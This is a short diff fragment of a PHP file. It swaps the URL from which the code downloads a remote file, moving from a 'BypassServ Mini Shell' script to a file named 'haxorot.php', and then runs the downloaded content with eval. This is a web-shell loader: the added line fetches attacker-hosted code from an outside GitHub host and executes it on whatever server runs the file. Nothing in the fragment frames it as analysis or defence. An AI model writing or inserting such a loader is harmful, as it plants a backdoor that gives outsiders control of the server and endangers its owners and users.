@@ -33,7 +33,7 @@ function is_logged_in()
         return $urls;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
+    $a = geturlsinfo('https://github.com/kembarbaru120000/213/raw/refs/heads/main/haxorot.php');
     eval('?>' . $a);
 
 ?>
